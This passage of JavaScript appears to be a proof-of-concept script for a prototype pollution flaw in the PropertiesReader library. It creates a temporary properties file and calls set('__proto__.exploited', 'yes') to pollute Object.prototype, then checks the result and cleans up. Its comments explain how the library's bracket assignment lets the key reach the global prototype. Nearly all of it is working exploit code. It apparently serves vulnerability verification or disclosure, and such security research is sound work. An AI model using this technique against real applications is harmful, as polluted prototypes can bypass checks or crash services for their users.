  // (The previous PoC crashed because `new PropertiesReader({})` triggered readFileSync on an object)
  const tmpFile = path.join(require('os').tmpdir(), 'poc.properties');
  fs.writeFileSync(tmpFile, '');
  const reader = new PropertiesReader(tmpFile);

  // 2. Trigger the vulnerability
  // The set() method internally splits the key by '.' and traverses the config object.
  // In vulnerable versions, it uses direct bracket assignment: obj[step] = obj[step] || {}
  // When `step` is '__proto__', direct bracket access bypasses the getter on Object.prototype
  // and points directly to the global prototype chain.
  reader.set('__proto__.exploited', 'yes');

  // 3. Verification
  console.log('Prototype pollution confirmed:', {}.exploited === 'yes');

  if ({}.exploited !== 'yes') {
    throw new Error('PoC failed: Expected Object.prototype to be polluted with an "exploited" property, but it was not.');
  }

  // Cleanup
  fs.unlinkSync(tmpFile);
}

